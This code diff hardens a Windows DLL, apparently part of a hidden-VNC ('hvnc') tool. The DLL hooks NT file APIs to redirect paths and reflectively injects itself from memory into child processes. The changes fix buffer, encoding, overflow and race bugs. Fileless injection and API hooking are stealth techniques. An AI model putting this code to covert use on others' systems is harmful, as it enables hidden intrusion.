@@ -32,21 +32,40 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 #endif
 #endif
 
-    // Global search and replacement strings (filled from parameter)
-    static WCHAR g_SearchString[512] = { 0 };
-    static WCHAR g_ReplacementString[512] = { 0 };
+    // Global search and replacement strings (filled from environment variables).
+    // 2048 WCHARs (4 KB) accommodates deep UNC paths and long-path-enabled paths
+    // well beyond the legacy MAX_PATH of 260.
+    static WCHAR g_SearchString[2048] = { 0 };
+    static WCHAR g_ReplacementString[2048] = { 0 };
+
+    // UNICODE_STRING.Length / .MaximumLength are USHORT (max 65,535 bytes = 32,767 WCHARs).
+    // Any replacement path longer than this cannot be represented without wrapping.
+    #define UNICODE_STRING_MAX_WCHARS  ((SIZE_T)32767)
     static BOOL g_HooksInitialized = FALSE;
     static HANDLE g_LogFile = INVALID_HANDLE_VALUE;
     static HANDLE g_CrashLog = INVALID_HANDLE_VALUE;
 
     // %TEMP%\crashlogovd.log
+    // Both CrashLog (narrow) and CrashLogW (wide) write UTF-16LE so the file
+    // is a single coherent encoding.  The BOM is written once when the file is
+    // opened (see InstallNtApiHooks).  This makes paths containing Cyrillic,
+    // Chinese, Arabic, etc. readable in any standard text editor.
     void CrashLog(const char* message) {
         if (g_CrashLog != INVALID_HANDLE_VALUE) {
             DWORD written;
-            DWORD messageLen = (DWORD)strlen(message);
-            WriteFile(g_CrashLog, message, messageLen, &written, NULL);
-            const char newline[] = "\r\n";
-            WriteFile(g_CrashLog, newline, sizeof(newline) - 1, &written, NULL);
+            // Convert the narrow (ASCII/UTF-8) string to UTF-16LE before writing
+            // so the file stays a single coherent encoding.
+            int wlen = MultiByteToWideChar(CP_ACP, 0, message, -1, NULL, 0);
+            if (wlen > 0) {
+                WCHAR wbuf[512];
+                int copyLen = (wlen <= 512) ? wlen : 512;
+                MultiByteToWideChar(CP_ACP, 0, message, -1, wbuf, copyLen);
+                wbuf[copyLen - 1] = L'\0'; // ensure null termination
+                DWORD byteLen = (DWORD)(wcslen(wbuf) * sizeof(WCHAR));
+                WriteFile(g_CrashLog, wbuf, byteLen, &written, NULL);
+            }
+            const WCHAR newline[] = L"\r\n";
+            WriteFile(g_CrashLog, newline, (DWORD)(2 * sizeof(WCHAR)), &written, NULL);
             FlushFileBuffers(g_CrashLog);
         }
     }
@@ -56,8 +75,8 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             DWORD written;
             DWORD messageLen = (DWORD)wcslen(message) * sizeof(WCHAR);
             WriteFile(g_CrashLog, message, messageLen, &written, NULL);
-            const char newline[] = "\r\n";
-            WriteFile(g_CrashLog, newline, sizeof(newline) - 1, &written, NULL);
+            const WCHAR newline[] = L"\r\n";
+            WriteFile(g_CrashLog, newline, (DWORD)(2 * sizeof(WCHAR)), &written, NULL);
             FlushFileBuffers(g_CrashLog);
         }
     }
@@ -81,11 +100,19 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 #if ENABLE_DEBUG_LOGGING
         if (g_LogFile != INVALID_HANDLE_VALUE) {
             DWORD written;
-            DWORD messageLen = (DWORD)strlen(message);
-            WriteFile(g_LogFile, message, messageLen, &written, NULL);
-
-            const char newline[] = "\r\n";
-            WriteFile(g_LogFile, newline, sizeof(newline) - 1, &written, NULL);
+            // Convert narrow string to UTF-16LE to keep the log file a single
+            // coherent encoding (UTF-16LE with BOM written at file open).
+            int wlen = MultiByteToWideChar(CP_ACP, 0, message, -1, NULL, 0);
+            if (wlen > 0) {
+                WCHAR wbuf[512];
+                int copyLen = (wlen <= 512) ? wlen : 512;
+                MultiByteToWideChar(CP_ACP, 0, message, -1, wbuf, copyLen);
+                wbuf[copyLen - 1] = L'\0';
+                DWORD byteLen = (DWORD)(wcslen(wbuf) * sizeof(WCHAR));
+                WriteFile(g_LogFile, wbuf, byteLen, &written, NULL);
+            }
+            const WCHAR newline[] = L"\r\n";
+            WriteFile(g_LogFile, newline, (DWORD)(2 * sizeof(WCHAR)), &written, NULL);
             FlushFileBuffers(g_LogFile);
         }
 #endif
@@ -102,22 +129,31 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         return (result == CSTR_LESS_THAN) ? -1 : 1;
     }
 
-    // Helper function to normalize NT paths - skip \??\ prefix if present
+    // Helper function to normalize NT paths - skip \??\ prefix if present.
+    //
+    // Handled prefixes:
+    //   \??\          — NT object namespace prefix for DOS device paths (e.g. \??\C:\...)
+    //   \??\UNC\      — NT UNC path (e.g. \??\UNC\server\share\...) — strip only the \??\
+    //                   leaving UNC\ visible so search/replace still matches correctly
+    //   \??\Volume{…} — Volume GUID paths — strip only the \??\ prefix
+    //   \Device\      — Raw device paths — left as-is (no stripping)
     const WCHAR* NormalizePath(const WCHAR* path, SIZE_T* adjustedLength) {
         if (!path || !adjustedLength) return path;
 
         SIZE_T length = *adjustedLength;
 
-        // Check for \??\ prefix (NT object namespace for DOS devices)
+        // Check for \??\ prefix (NT object namespace for DOS devices, UNC, and GUID volumes).
+        // Strip the 4-character prefix in all cases; the caller then sees the "canonical"
+        // Win32-equivalent form (C:\..., UNC\server\share\..., Volume{GUID}\...).
         if (length >= 4 && path[0] == L'\\' && path[1] == L'?' && path[2] == L'?' && path[3] == L'\\') {
             *adjustedLength = length - 4;
             return path + 4;
         }
 
-        // Check for \Device\ or \DEVICE\ prefix
-        if (length >= 8 &&
-            (wcsnicmp_custom(path, L"\\DEVICE\\", 8) == 0 || wcsnicmp_custom(path, L"\\Device\\", 8) == 0)) {
-            // Don't adjust - these are device paths, not file paths
+        // Check for \Device\ prefix (raw device path — e.g. \Device\HarddiskVolume3\...).
+        // Do NOT strip: these are not Win32-rooted paths and the search string is
+        // expected to be a Win32-style path, so the match would be spurious.
+        if (length >= 8 && wcsnicmp_custom(path, L"\\Device\\", 8) == 0) {
             return path;
         }
 
@@ -350,7 +386,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 if (g_LogFile != INVALID_HANDLE_VALUE) {
                     LogDebug(L"[NeedsRedirection] MATCH FOUND at position ");
                     WCHAR posStr[32];
-                    wsprintfW(posStr, L"%zu", i);
+                    wsprintfW(posStr, L"%Iu", i); // %Iu is the Win32 API SIZE_T format specifier; %zu is C99 CRT-only
                     LogDebug(posStr);
                 }
                 return TRUE;
@@ -390,8 +426,12 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 
         if (occurrences == 0) return NULL;
 
-        // Calculate new length (prefix + modified path)
-        SIZE_T calcNewLength = prefixLength + normalizedLength + (occurrences * (replaceLen - searchLen));
+        // Calculate new length (prefix + modified path).
+        // Avoid SIZE_T unsigned underflow when replaceLen < searchLen by computing
+        // additions and subtractions separately (all terms are non-negative).
+        SIZE_T calcNewLength = prefixLength + normalizedLength
+            - (occurrences * searchLen)
+            + (occurrences * replaceLen);
         WCHAR* newPath = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (calcNewLength + 1) * sizeof(WCHAR));
         if (!newPath) return NULL;
 
@@ -460,17 +500,25 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);
 
                     if (buffer) {
-                        WCHAR tempBuf[512] = { 0 };
-                        SIZE_T copyLen = newLength < 511 ? newLength : 511;
-                        wcsncpy_s(tempBuf, 512, buffer, copyLen);
-                        LogDebug(L"[NtCreateFile] *** REDIRECTING TO: ");
-                        LogDebug(tempBuf);
+                        if (newLength > UNICODE_STRING_MAX_WCHARS) {
+                            // Replacement path too long to fit in a UNICODE_STRING (USHORT
+                            // byte-count would wrap).  Skip redirection and use original path.
+                            CrashLog("[NtCreateFile] WARN: replacement path exceeds UNICODE_STRING max — skipping redirect");
+                            HeapFree(GetProcessHeap(), 0, buffer);
+                            buffer = NULL;
+                        } else {
+                            WCHAR tempBuf[512] = { 0 };
+                            SIZE_T copyLen = newLength < 511 ? newLength : 511;
+                            wcsncpy_s(tempBuf, 512, buffer, copyLen);
+                            LogDebug(L"[NtCreateFile] *** REDIRECTING TO: ");
+                            LogDebug(tempBuf);
 
-                        originalString = ObjectAttributes->ObjectName;
-                        newString.Buffer = buffer;
-                        newString.Length = (USHORT)(newLength * sizeof(WCHAR));
-                        newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
-                        ObjectAttributes->ObjectName = &newString;
+                            originalString = ObjectAttributes->ObjectName;
+                            newString.Buffer = buffer;
+                            newString.Length = (USHORT)(newLength * sizeof(WCHAR));
+                            newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
+                            ObjectAttributes->ObjectName = &newString;
+                        }
                     }
                     else {
                         LogDebug(L"[NtCreateFile] ReplacePath returned NULL");
@@ -528,17 +576,23 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);
 
                     if (buffer) {
-                        WCHAR tempBuf[512] = { 0 };
-                        SIZE_T copyLen = newLength < 511 ? newLength : 511;
-                        wcsncpy_s(tempBuf, 512, buffer, copyLen);
-                        LogDebug(L"[NtOpenFile] *** REDIRECTING TO: ");
-                        LogDebug(tempBuf);
+                        if (newLength > UNICODE_STRING_MAX_WCHARS) {
+                            CrashLog("[NtOpenFile] WARN: replacement path exceeds UNICODE_STRING max — skipping redirect");
+                            HeapFree(GetProcessHeap(), 0, buffer);
+                            buffer = NULL;
+                        } else {
+                            WCHAR tempBuf[512] = { 0 };
+                            SIZE_T copyLen = newLength < 511 ? newLength : 511;
+                            wcsncpy_s(tempBuf, 512, buffer, copyLen);
+                            LogDebug(L"[NtOpenFile] *** REDIRECTING TO: ");
+                            LogDebug(tempBuf);
 
-                        originalString = ObjectAttributes->ObjectName;
-                        newString.Buffer = buffer;
-                        newString.Length = (USHORT)(newLength * sizeof(WCHAR));
-                        newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
-                        ObjectAttributes->ObjectName = &newString;
+                            originalString = ObjectAttributes->ObjectName;
+                            newString.Buffer = buffer;
+                            newString.Length = (USHORT)(newLength * sizeof(WCHAR));
+                            newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
+                            ObjectAttributes->ObjectName = &newString;
+                        }
                     }
                     else {
                         LogDebug(L"[NtOpenFile] ReplacePath returned NULL");
@@ -578,11 +632,17 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);
 
                     if (buffer) {
-                        originalString = ObjectAttributes->ObjectName;
-                        newString.Buffer = buffer;
-                        newString.Length = (USHORT)(newLength * sizeof(WCHAR));
-                        newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
-                        ObjectAttributes->ObjectName = &newString;
+                        if (newLength > UNICODE_STRING_MAX_WCHARS) {
+                            CrashLog("[NtDeleteFile] WARN: replacement path exceeds UNICODE_STRING max — skipping redirect");
+                            HeapFree(GetProcessHeap(), 0, buffer);
+                            buffer = NULL;
+                        } else {
+                            originalString = ObjectAttributes->ObjectName;
+                            newString.Buffer = buffer;
+                            newString.Length = (USHORT)(newLength * sizeof(WCHAR));
+                            newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
+                            ObjectAttributes->ObjectName = &newString;
+                        }
                     }
                 }
             }
@@ -612,40 +672,81 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
     ) {
         if (!OriginalNtSetInformationFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL
 
+        // FileRenameInformation (class 10): BOOLEAN ReplaceIfExists + HANDLE + ULONG len + WCHAR[]
+        // FileRenameInformationEx (class 65): ULONG Flags (32-bit bitfield) + HANDLE + ULONG len + WCHAR[]
+        // These have different first-field types; use separate structs to avoid truncating Flags.
         typedef struct {
             BOOLEAN ReplaceIfExists;
+            HANDLE  RootDirectory;
+            ULONG   FileNameLength;
+            WCHAR   FileName[1];
+        } FILE_RENAME_INFO_V1;
+
+        typedef struct {
+            ULONG  Flags;           // FILE_RENAME_REPLACE_IF_EXISTS | FILE_RENAME_POSIX_SEMANTICS | ...
             HANDLE RootDirectory;
-            ULONG FileNameLength;
-            WCHAR FileName[1];
-        } FILE_RENAME_INFO;
+            ULONG  FileNameLength;
+            WCHAR  FileName[1];
+        } FILE_RENAME_INFO_V2;
+
+        WCHAR* newPath = NULL;
 
         __try {
             if (g_HooksInitialized && FileInformation && (FileInformationClass == FileRenameInformation || FileInformationClass == FileRenameInformationEx)) {
-                FILE_RENAME_INFO* renameInfo = (FILE_RENAME_INFO*)FileInformation;
-                if (renameInfo->FileNameLength > 0) {
-                    SIZE_T pathLength = renameInfo->FileNameLength / sizeof(WCHAR);
+                // Use V1 layout to read FileNameLength (offset is the same in both structs
+                // after the first field + alignment).  Only access FileName[], which starts
+                // at the same relative position in both.
+                FILE_RENAME_INFO_V1* renameInfoV1 = (FILE_RENAME_INFO_V1*)FileInformation;
+                FILE_RENAME_INFO_V2* renameInfoV2 = (FILE_RENAME_INFO_V2*)FileInformation;
 
-                    if (NeedsRedirection(renameInfo->FileName, pathLength)) {
+                ULONG  fileNameLength = (FileInformationClass == FileRenameInformation)
+                                        ? renameInfoV1->FileNameLength
+                                        : renameInfoV2->FileNameLength;
+                WCHAR* fileName       = (FileInformationClass == FileRenameInformation)
+                                        ? renameInfoV1->FileName
+                                        : renameInfoV2->FileName;
+
+                if (fileNameLength > 0) {
+                    SIZE_T pathLength = fileNameLength / sizeof(WCHAR);
+
+                    if (NeedsRedirection(fileName, pathLength)) {
                         SIZE_T newLength = 0;
-                        WCHAR* newPath = ReplacePath(renameInfo->FileName, pathLength, &newLength);
+                        newPath = ReplacePath(fileName, pathLength, &newLength);
 
                         if (newPath) {
-                            ULONG newInfoSize = sizeof(FILE_RENAME_INFO) - sizeof(WCHAR) + (newLength * sizeof(WCHAR));
-                            FILE_RENAME_INFO* newRenameInfo = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newInfoSize);
+                            ULONG newInfoSize;
+                            LPVOID newRenameInfo = NULL;
+
+                            if (FileInformationClass == FileRenameInformation) {
+                                newInfoSize = (ULONG)(sizeof(FILE_RENAME_INFO_V1) - sizeof(WCHAR) + newLength * sizeof(WCHAR));
+                                FILE_RENAME_INFO_V1* ni = (FILE_RENAME_INFO_V1*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newInfoSize);
+                                if (ni) {
+                                    ni->ReplaceIfExists = renameInfoV1->ReplaceIfExists;
+                                    ni->RootDirectory   = renameInfoV1->RootDirectory;
+                                    ni->FileNameLength  = (ULONG)(newLength * sizeof(WCHAR));
+                                    memcpy(ni->FileName, newPath, ni->FileNameLength);
+                                    newRenameInfo = ni;
+                                }
+                            } else {
+                                newInfoSize = (ULONG)(sizeof(FILE_RENAME_INFO_V2) - sizeof(WCHAR) + newLength * sizeof(WCHAR));
+                                FILE_RENAME_INFO_V2* ni = (FILE_RENAME_INFO_V2*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newInfoSize);
+                                if (ni) {
+                                    ni->Flags          = renameInfoV2->Flags;    // preserve all 32-bit flags
+                                    ni->RootDirectory  = renameInfoV2->RootDirectory;
+                                    ni->FileNameLength = (ULONG)(newLength * sizeof(WCHAR));
+                                    memcpy(ni->FileName, newPath, ni->FileNameLength);
+                                    newRenameInfo = ni;
+                                }
+                            }
+
+                            HeapFree(GetProcessHeap(), 0, newPath);
+                            newPath = NULL;
 
                             if (newRenameInfo) {
-                                newRenameInfo->ReplaceIfExists = renameInfo->ReplaceIfExists;
-                                newRenameInfo->RootDirectory = renameInfo->RootDirectory;
-                                newRenameInfo->FileNameLength = (ULONG)(newLength * sizeof(WCHAR));
-                                memcpy(newRenameInfo->FileName, newPath, newRenameInfo->FileNameLength);
-
                                 NTSTATUS result = OriginalNtSetInformationFile(FileHandle, IoStatusBlock, newRenameInfo, newInfoSize, FileInformationClass);
-
                                 HeapFree(GetProcessHeap(), 0, newRenameInfo);
-                                HeapFree(GetProcessHeap(), 0, newPath);
                                 return result;
                             }
-                            HeapFree(GetProcessHeap(), 0, newPath);
                         }
                     }
                 }
@@ -653,6 +754,8 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         }
         __except (EXCEPTION_EXECUTE_HANDLER) {
             char _excMsg[64]; sprintf_s(_excMsg, 64, "[HOOK] NtSetInfoFile exception: 0x%X", GetExceptionCode()); CrashLog(_excMsg);
+            // Free newPath if an exception fires after allocation but before the HeapFree below.
+            if (newPath) { HeapFree(GetProcessHeap(), 0, newPath); newPath = NULL; }
         }
 
         return OriginalNtSetInformationFile(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
@@ -677,11 +780,17 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);
 
                     if (buffer) {
-                        originalString = ObjectAttributes->ObjectName;
-                        newString.Buffer = buffer;
-                        newString.Length = (USHORT)(newLength * sizeof(WCHAR));
-                        newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
-                        ObjectAttributes->ObjectName = &newString;
+                        if (newLength > UNICODE_STRING_MAX_WCHARS) {
+                            CrashLog("[NtQueryAttribs] WARN: replacement path exceeds UNICODE_STRING max — skipping redirect");
+                            HeapFree(GetProcessHeap(), 0, buffer);
+                            buffer = NULL;
+                        } else {
+                            originalString = ObjectAttributes->ObjectName;
+                            newString.Buffer = buffer;
+                            newString.Length = (USHORT)(newLength * sizeof(WCHAR));
+                            newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
+                            ObjectAttributes->ObjectName = &newString;
+                        }
                     }
                 }
             }
@@ -721,11 +830,17 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);
 
                     if (buffer) {
-                        originalString = ObjectAttributes->ObjectName;
-                        newString.Buffer = buffer;
-                        newString.Length = (USHORT)(newLength * sizeof(WCHAR));
-                        newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
-                        ObjectAttributes->ObjectName = &newString;
+                        if (newLength > UNICODE_STRING_MAX_WCHARS) {
+                            CrashLog("[NtQueryFullAttribs] WARN: replacement path exceeds UNICODE_STRING max — skipping redirect");
+                            HeapFree(GetProcessHeap(), 0, buffer);
+                            buffer = NULL;
+                        } else {
+                            originalString = ObjectAttributes->ObjectName;
+                            newString.Buffer = buffer;
+                            newString.Length = (USHORT)(newLength * sizeof(WCHAR));
+                            newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
+                            ObjectAttributes->ObjectName = &newString;
+                        }
                     }
                 }
             }
@@ -795,7 +910,11 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 return rva - virtualAddr + rawDataPtr;
             }
         }
-        if (numSections > 0) {
+        // Fallback: if the RVA falls before any section's raw data it maps 1:1.
+        // Guard the read of the first section's PointerToRawData (offset +20) so a
+        // malformed or truncated PE with sectionOff near the end of the buffer does
+        // not produce an out-of-bounds read.
+        if (numSections > 0 && sectionOff + 24 <= peSize) {
             DWORD firstRawPtr = *(DWORD*)(pe + sectionOff + 20);
             if (rva < firstRawPtr) return rva;
         }
@@ -833,6 +952,10 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         if (exportDirRVA == 0) return 0;
 
         DWORD sectionOff = optOff + sizeOfOptionalHeader;
+        // sizeOfOptionalHeader is an untrusted WORD from the PE header.  If it is
+        // abnormally large, sectionOff would exceed peSize and every subsequent
+        // _rva2fo call and section-table read would be out-of-bounds.
+        if (sectionOff > peSize) return 0;
 
         // RVA to file offset helper (inline)
         #define RVA2FO(rva) _rva2fo((rva), pe, peSize, sectionOff, numberOfSections)
@@ -840,6 +963,10 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         if (exportDirFO == 0 || exportDirFO + 40 > peSize) return 0;
 
         DWORD numberOfNames         = *(DWORD*)(pe + exportDirFO + 24);
+        // A legitimately built DLL will have far fewer than 65536 exports.  Cap the
+        // value to prevent integer overflow in the loop index arithmetic (i * 4) when
+        // the PE contains an abnormally large numberOfNames.
+        if (numberOfNames > 0x10000) return 0;
         DWORD addressOfFunctionsRVA  = *(DWORD*)(pe + exportDirFO + 28);
         DWORD addressOfNamesRVA      = *(DWORD*)(pe + exportDirFO + 32);
         DWORD addressOfOrdinalsRVA   = *(DWORD*)(pe + exportDirFO + 36);
@@ -914,13 +1041,26 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         }
 
         DWORD waitResult = WaitForSingleObject(hThread, 30000);
-        if (waitResult == WAIT_TIMEOUT) {
-            CrashLog("[ChildInject] WARN: loader thread timed out (30s)");
-        } else {
-            CrashLog("[ChildInject] OK: child injection completed");
-        }
         CloseHandle(hThread);
-        return TRUE;
+
+        if (waitResult == WAIT_OBJECT_0) {
+            CrashLog("[ChildInject] OK: child injection completed");
+            return TRUE;
+        } else if (waitResult == WAIT_TIMEOUT) {
+            // The loader thread is still running.  Returning FALSE causes
+            // HookedCreateProcessW to resume the child with a comment noting that
+            // hooks may not be fully installed yet (fail-open policy: we still
+            // resume to avoid leaving the child process permanently suspended).
+            CrashLog("[ChildInject] WARN: loader thread timed out after 30s — hooks may not be active in child");
+            LogDebug(L"[ChildInject] Loader thread timeout — child will resume without guaranteed hooks");
+            return FALSE;
+        } else {
+            // WAIT_FAILED or any unexpected value
+            char msg[128];
+            sprintf_s(msg, 128, "[ChildInject] FAIL: WaitForSingleObject error 0x%lX", GetLastError());
+            CrashLog(msg);
+            return FALSE;
+        }
     }
 
     BOOL WINAPI HookedCreateProcessW(
@@ -937,7 +1077,15 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
     ) {
         if (!OriginalCreateProcessW) return FALSE;
 
-        if (!g_HooksInitialized || !g_DllRawBytes || g_DllRawSize == 0) {
+        // Snapshot g_DllRawBytes / g_DllRawSize into locals *before* any check.
+        // RemoveNtApiHooks() can race here: it calls UnmapViewOfFile(g_DllRawBytes)
+        // and sets g_DllRawBytes = NULL on DLL_PROCESS_DETACH.  Without the snapshot,
+        // a TOCTOU between the NULL-check below and the use inside ReflectiveInjectIntoChild
+        // would pass the now-unmapped pointer to WriteProcessMemory, causing an AV.
+        const BYTE* localDllBytes = (const BYTE*)g_DllRawBytes;
+        DWORD       localDllSize  = g_DllRawSize;
+
+        if (!g_HooksInitialized || !localDllBytes || localDllSize == 0) {
             return OriginalCreateProcessW(
                 lpApplicationName, lpCommandLine,
                 lpProcessAttributes, lpThreadAttributes,
@@ -961,8 +1109,9 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         if (result && lpProcessInformation) {
             CrashLog("[CreateProcessW] Injecting DLL into child process...");
             LogDebug(L"[CreateProcessW] Reflective-injecting DLL into child process");
-            if (!ReflectiveInjectIntoChild(lpProcessInformation->hProcess,
-                    (const BYTE*)g_DllRawBytes, g_DllRawSize)) {
+            BOOL injected = ReflectiveInjectIntoChild(lpProcessInformation->hProcess,
+                                localDllBytes, localDllSize);
+            if (!injected) {
                 CrashLog("[CreateProcessW] Child injection FAILED");
                 LogDebug(L"[CreateProcessW] Child injection failed");
             } else {
@@ -970,7 +1119,9 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 LogDebug(L"[CreateProcessW] Child injection succeeded");
             }
 
-            // Always resume the child if we suspended it — don't leave zombie processes
+            // Always resume the child if we suspended it — don't leave zombie processes.
+            // Even if injection failed we resume; the child runs without hooks rather than
+            // hanging forever (fail-open policy).
             if (!wasSuspended) {
                 ResumeThread(lpProcessInformation->hThread);
             }
@@ -984,9 +1135,16 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         // Use a global try-catch to prevent any crashes
         __try {
             __try {
-                WCHAR crashLogPath[512];
-                ExpandEnvironmentStringsW(L"%TEMP%\\crashlogovd.log", crashLogPath, 512);
+                WCHAR crashLogPath[1024];
+                ExpandEnvironmentStringsW(L"%TEMP%\\crashlogovd.log", crashLogPath, 1024);
                 g_CrashLog = CreateFileW(crashLogPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (g_CrashLog != INVALID_HANDLE_VALUE) {
+                    // Write UTF-16LE BOM so all log entries (including wide paths) are
+                    // readable in any standard text editor on non-English systems.
+                    DWORD written;
+                    const WCHAR bom = 0xFEFF;
+                    WriteFile(g_CrashLog, &bom, sizeof(WCHAR), &written, NULL);
+                }
             }
             __except (EXCEPTION_EXECUTE_HANDLER) {
                 g_CrashLog = INVALID_HANDLE_VALUE;
@@ -996,10 +1154,16 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 
 #if ENABLE_DEBUG_LOGGING
             // Enable verbose logging for debugging
-            WCHAR logPath[512];
+            WCHAR logPath[1024];
             __try {
-                ExpandEnvironmentStringsW(L"%TEMP%\\rdi_hooks.log", logPath, 512);
+                ExpandEnvironmentStringsW(L"%TEMP%\\rdi_hooks.log", logPath, 1024);
                 g_LogFile = CreateFileW(logPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (g_LogFile != INVALID_HANDLE_VALUE) {
+                    // Write UTF-16LE BOM for consistent encoding across all log entries.
+                    DWORD written;
+                    const WCHAR bom = 0xFEFF;
+                    WriteFile(g_LogFile, &bom, sizeof(WCHAR), &written, NULL);
+                }
             }
             __except (EXCEPTION_EXECUTE_HANDLER) {
                 g_LogFile = INVALID_HANDLE_VALUE;
@@ -1021,20 +1185,34 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 
             // Try to get configuration from environment variables
             __try {
-                WCHAR envSearchString[512] = { 0 };
-                WCHAR envReplaceString[512] = { 0 };
+                // Use the same capacity as the global g_SearchString / g_ReplacementString
+                // buffers (2048 WCHARs) so that very long paths are never silently truncated.
+                // GetEnvironmentVariableW returns 0 on error; if the return value equals the
+                // buffer size, the value was truncated — treat that as an error and log it.
+                WCHAR envSearchString[2048] = { 0 };
+                WCHAR envReplaceString[2048] = { 0 };
 
-                DWORD searchLen = GetEnvironmentVariableW(L"RDI_SEARCH_PATH", envSearchString, 512);
-                DWORD replaceLen = GetEnvironmentVariableW(L"RDI_REPLACE_PATH", envReplaceString, 512);
+                DWORD searchLen = GetEnvironmentVariableW(L"RDI_SEARCH_PATH", envSearchString, 2048);
+                DWORD replaceLen = GetEnvironmentVariableW(L"RDI_REPLACE_PATH", envReplaceString, 2048);
 
-                if (searchLen > 0 && searchLen < 512 && replaceLen > 0 && replaceLen < 512) {
+                // A return value >= buffer capacity means the value was truncated.
+                if (searchLen >= 2048) {
+                    CrashLog("[ENV] WARN: RDI_SEARCH_PATH is >= 2048 chars and was truncated — path redirection disabled");
+                    searchLen = 0;
+                }
+                if (replaceLen >= 2048) {
+                    CrashLog("[ENV] WARN: RDI_REPLACE_PATH is >= 2048 chars and was truncated — path redirection disabled");
+                    replaceLen = 0;
+                }
+
+                if (searchLen > 0 && replaceLen > 0) {
                     CrashLog("[ENV] Search/Replace paths found");
                     CrashLogW(envSearchString);
                     CrashLog(" -> ");
                     CrashLogW(envReplaceString);
-                    wcsncpy_s(g_SearchString, 512, envSearchString, searchLen);
+                    wcsncpy_s(g_SearchString, 2048, envSearchString, searchLen);
                     g_SearchString[searchLen] = L'\0';
-                    wcsncpy_s(g_ReplacementString, 512, envReplaceString, replaceLen);
+                    wcsncpy_s(g_ReplacementString, 2048, envReplaceString, replaceLen);
                     g_ReplacementString[replaceLen] = L'\0';
 
                     if (g_LogFile != INVALID_HANDLE_VALUE) {
@@ -1057,18 +1235,45 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     }
                 }
 
-                // Read DLL section for child process injection (in-memory, no file on disk)
+                // Read DLL section for child process injection (in-memory, no file on disk).
+                // Section names are kernel object names — MAX_PATH (260) is more than enough,
+                // but we use 512 to be safe.  DLL size is a plain decimal number, 32 is ample.
                 WCHAR envSectionName[512] = { 0 };
                 WCHAR envDllSize[32] = { 0 };
                 DWORD sectionNameLen = GetEnvironmentVariableW(L"RDI_DLL_SECTION", envSectionName, 512);
-                DWORD dllSizeLen = GetEnvironmentVariableW(L"RDI_DLL_SIZE", envDllSize, 32);
+                DWORD dllSizeLen     = GetEnvironmentVariableW(L"RDI_DLL_SIZE",    envDllSize,    32);
 
-                if (sectionNameLen > 0 && sectionNameLen < 512 && dllSizeLen > 0 && dllSizeLen < 32) {
-                    g_DllRawSize = 0;
+                if (sectionNameLen >= 512) {
+                    CrashLog("[ENV] WARN: RDI_DLL_SECTION is >= 512 chars and was truncated — child injection disabled");
+                    sectionNameLen = 0;
+                }
+                if (dllSizeLen >= 32) {
+                    CrashLog("[ENV] WARN: RDI_DLL_SIZE is >= 32 chars and was truncated — child injection disabled");
